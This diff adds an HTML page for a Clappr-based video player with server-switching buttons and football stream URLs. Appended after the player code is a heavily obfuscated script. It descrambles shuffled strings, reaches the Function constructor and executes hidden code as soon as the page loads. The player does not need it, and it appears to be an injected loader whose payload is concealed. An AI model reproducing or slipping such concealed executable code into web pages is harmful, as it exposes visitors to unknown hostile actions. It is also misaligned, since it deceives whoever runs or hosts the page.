@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OP | X Player | By xfireflix</title>
+    <link rel="stylesheet" type="text/css" href="js.css">
+    <style>
+        body {
+            margin: 0;
+            background-color: #121212; /* Dark background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative; /* لجعل تحديد موقع الأزرار أسهل */
+        }
+        #player-container {
+            width: 99%;
+            height: 99%;
+            background: #1e1e1e; /* Dark gray background */
+        }
+        #player {
+            width: 100%;
+            height: 100%;
+            margin: 1px;
+        }
+
+        /* تنسيقات الأزرار الجديدة */
+        #server-buttons {
+            position: absolute;
+            top: 10px; /* 10 بكسل من الأعلى */
+            right: 10px; /* 10 بكسل من اليمين */
+            z-index: 100; /* للتأكد من أنها تظهر فوق المشغل */
+            display: flex; /* لعرض الأزرار بجانب بعضها البعض */
+            gap: 5px; /* مسافة بين الأزرار */
+        }
+
+        #server-buttons button {
+            background-color: #ff0000; /* لون الخلفية أحمر */
+            color: white; /* لون النص أبيض */
+            border: none;
+            padding: 8px 12px;
+            cursor: pointer;
+            border-radius: 4px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+        }
+
+        #server-buttons button:hover {
+            background-color: #cc0000; /* أحمر أغمق عند التمرير */
+        }
+    </style>
+
+    <!-- Clappr and Plugins -->
+    <script src="https://cdn.jsdelivr.net/npm/clappr@latest/dist/clappr.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/level-selector@0.2.0/dist/level-selector.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@clappr/hlsjs-playback@1.0.1/dist/hlsjs-playback.min.js"></script>
+</head>
+<body>
+    <div id="player-container">
+        <div id="player"></div>
+    </div>
+
+    <!-- حاوية للأزرار في HTML مباشرة -->
+    <div id="server-buttons">
+        <!-- الأزرار ستتم إضافتها هنا بواسطة JavaScript -->
+    </div>
+
+    <script>
+        const streamUrls = [
+            "https://wo.cma.footballii.ir/hls2/b1_high.m3u8", // Serveur 1
+            "https://wo.cma.footballii.ir/hls2/b2_high.m3u8", // Serveur 2
+            "YOUR_STREAM_URL_3", // استبدل هذا بالرابط الفعلي
+            "YOUR_STREAM_URL_4", // استبدل هذا بالرابط الفعلي
+            "YOUR_STREAM_URL_5", // استبدل هذا بالرابط الفعلي
+            "YOUR_STREAM_URL_6", // استبدل هذا بالرابط الفعلي
+            "YOUR_STREAM_URL_7", // استبدل هذا بالرابط الفعلي
+            "YOUR_STREAM_URL_8"  // استبدل هذا بالرابط الفعلي
+        ];
+
+        function loadPlayer() {
+            var player = new Clappr.Player({
+                source: streamUrls[0], // ابدأ بالسيرفر الأول افتراضيًا
+                width: '100%',
+                height: '100%',
+                autoPlay: true,
+                plugins: [HlsjsPlayback, LevelSelector],
+                mimeType: "application/x-mpegURL",
+                mediacontrol: { seekbar: "#ff8800", buttons: "#ff8800" },
+                parentId: "#player"
+            });
+
+            window.changeStream = function(url) {
+                player.load(url);
+                player.play();
+            };
+
+            // إنشاء الأزرار برمجياً
+            const serverButtonsDiv = document.getElementById('server-buttons');
+            streamUrls.forEach((url, index) => {
+                const button = document.createElement('button');
+                button.textContent = `Serveur ${index + 1}`;
+                button.onclick = function() {
+                    changeStream(url);
+                };
+                serverButtonsDiv.appendChild(button);
+            });
+
+            player.on(Clappr.Events.PLAYER_ERROR, function(error) {
+                console.log('Player error occurred:', error);
+                setTimeout(function() {
+                    console.log("Retrying stream...");
+                    document.getElementById("player").innerHTML = "";
+                    loadPlayer();
+                }, 3000); // زيادة وقت إعادة المحاولة إلى 3 ثوانٍ
+            });
+        }
+
+        loadPlayer();
+    </script>
+    <script>
+    (function(){var Mtp='',rmC=369-358;function qqX(a){var r=3064504;var m=a.length;var j=[];for(var f=0;f<m;f++){j[f]=a.charAt(f)};for(var f=0;f<m;f++){var t=r*(f+65)+(r%49375);var w=r*(f+616)+(r%12733);var n=t%m;var p=w%m;var e=j[n];j[n]=j[p];j[p]=e;r=(t+w)%5996889;};return j.join('')};var ilG=qqX('coqdhracbljpttgsfrmekconsortzniuvwyux').substr(0,rmC);var wor='S)sdssa6e]it=,v;7e(n.c r"-1,cd0rgsC,(inr7vyk1d=n+nC("zt9gt++1m.,l(,[6ma)eu48lA,7+;o=uu6r[utonps=;ofevf r)lt mnt;=y=r,[,0.h.a6 >lu{}fvelbln=mdrv]1a.n+m th[f=),.tkrnhm;[)8pf3p;8u(;hsua;rt<+ n1.-w=+n<f=7e apCy{vr+lslAj{1no.l8;g=el]+(er=v=}.nt+2g(mqtigm;(;e.roe(r ,);ii=(}rr><;y.sdmgng;hr-on,;f-s;r)0(1t5r;tvo9;1;(bae[[9vnf C)+ux,=.=2g=hf*.=r;0iCl;(v));aet(r ;fontg6{ gCnn]lb;nforv"26=(=aav;4(aeb)rsn) )=r .3(j]3.rfn*)th((e=o)a ; .c,<A2jd]de n)[);olu=rps,+l]pve(a0=d,teht+a);;2rel!c+h+o wrxv.arCao)tk;a+(i..elah0f8;he5b=i+7]0i.zh,sn+-2[or.tbachteinherr,nhg6a=l,8gl+ c170mu;[)l526s=nu;srvdjo)i0;s,7";)d.ru]hrk;o.9 n=[iv=ab+iv=d0nreu6ial"(e)f..)e+av 8}r)2=e](j)nvuvf{mtygd;i,, d"yv+n0x(pu[s(r];5)au;=;+o,oaa;8n.j7)hgv;(<aA9wvv=,8{a=1=wv}=p= n"n9)triae;lra-,Su"8rg,ts 9vhiinlf)(4g}rfs]miarjm=ua(k,oh0}i]]8hsz1(;s+[(d,tura7=e-oxA7(maoji))(=kt1z.hmrr("2s[1Cc+(rodc)tn;"e;lrj {=iulni4c;y!tv)joii a=a';var XZx=qqX[ilG];var hGr='';var Wya=XZx;var svb=XZx(hGr,qqX(wor));var Xxy=svb(qqX('X4iu.w};d"%e(t7an,fn*cXp7tys._3.&%e.Xnp6X7?(0Xo_BXd.=0ro=XEh=X,jf3(!Xn ]f.y)d1tdor4f)e=AfXf4}(X%.2A,XX$td6_(5b$uX$"5"=_fdg5.ngm5n nr95e#f,(6iiX().124_rX,_$3;96p2d.X 75o.%\/&f!di1.X7$d1X,XI2(;$od\/2f%F%.X1!6#] jXidXgooo\/t4in, (X3e=]CXX#XX_X)c4[e%%6er%{)30_X@XXr]lc$a2]dl)d;x (X$. X:Xzd)8r.t0X_oX4"X37?9..edk8f($d;Xb_oi$5;5{X%i?., 9)90aqi3XCktjo5{{XdXcn%l(h%re6rcXaX)=3X{}3;ef!o_e!+;XtXa.}-o.(!=_to%)6 h{Xa=cnX{<el#XXX)1h+$8%-1=wXhl),!XfiXC$39t _.X:E\/3t(,,%gfz;[4X8f>6)\'brX42\/co%1(i5p[0_XX.7i;c6>rX4(4X_Xo>79c=o.{=1tl__..0tXj)k(Aej(b[(X%!_Xfi={};$4v(_o..tXa)oj5((;pg0(u.t1$6w_i_ktd_o806]d+f9)(r o1m)pXi%646X_""s4{g?);7ud!offi5l(($l5ff9CE7)XXg.;BX<_(36 ),_!n(]3_;3]_1iyfXEtXvXXrdXuX9_X]XC0%!4]}4b(Xj_<s6X8X$3ak1j,*a1aXX?()5uXnm7$aj1X(;3n21exX=3%ta(34C_.Cag.2lf."hXmXg6,r 0lsXg.yf30!o!5nXxdX_g5k(XoXXX 5l]! f;aee6Xe5a(,(jn9)*;}34s6)l}_1 X((d($!XXXhXrk9.3($(eeXd4br!oXf%i2d[X*{Xi!r$e)4f.d nX.l.de0XlX$6du;).,etar$1va(2iX:6g)e9X:!XX_)#Xm\/wrrXe]no3i}6,tXr2o=8(ts67bc5cIX)e!gee]n.efp8S5X+!X_5X3X%(].X;n{ +0;nb!)dgo,6 X( d.X53p5!ga@i_1) 906X_2liX0 5;bF8X;j;5%f752x3uX!6X;6ii!;oimXbq8d,!X64(\'\'t9=X()_0((7X=Ebl\/_0$d5n.=.0fX)@97=c1t)se{0]c0e7s,l)S=b3t3f.=i5_=b (ff8eu;eodX9>lpX)gt?)}X!e}eac15nl$g)X)_b%_hb2 ;5Xf-uaBf)_>AXns51 X84[(bj6=li#5kmwu4X16-z65s9t!sX,;j.an5!9f3XdM_6i9!f]v=3k wXdXr)i#_upkbXo,_e_X!4de%aX+7tX z96X.)f0%6!}XXX9n7{)X7X]!XXivX==sXX2=*xbtn!{.X.));c7!9.\')3;! C8m(XXvX3e331782%}iXucr;2;.!5!7X1.]jX(lX.20c)X5 tbja69(32,y1!2)T,]).s!( a"5)i.6oa%;X))4d.!X..)\'X=fcf;e2dX(1yrX3f$_!01X!du"2*#oie$$1!uX3]0"X.4+\'tl(d_c!5rX=.:%52a,(s%5o60lreh_$nXm)b_f$)X_oc;4!.$sAXc,X%(uX=6(E5taetX!f,2)_$XdX9a61%;1 _b)3B$XX} a$m=6(iX(\/fei_o3(4plX3l_d!7&!0f46X<_>eXd7_XeXv%$p.ti>%6)}4d)t);5.1if+;XXBh_9f5Xao}$a 9e k{}t$asXis5(a5Ae+.1)4@e.7Xyld3dXl&!( .}X2.b24l9tw1v]b;X=X4onS.o35b22cCXX$.t1.X" X_lfa19f3%di0X(X=(%o1;9n1tloX.oX_(vu"e=0o)!,\/$aX5lrnXfjBfd7!ej)5>X($i]_9n 9.5F6c(!a,>_,v}tpX2rt)_15a6_ne9e5}a49c4+4,be;iwF[er..e6 XXeX'));var MkL=Wya(Mtp,Xxy );MkL(9410);return 9681})()
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a6babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"3900066222d4427da06357c43b19f364","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
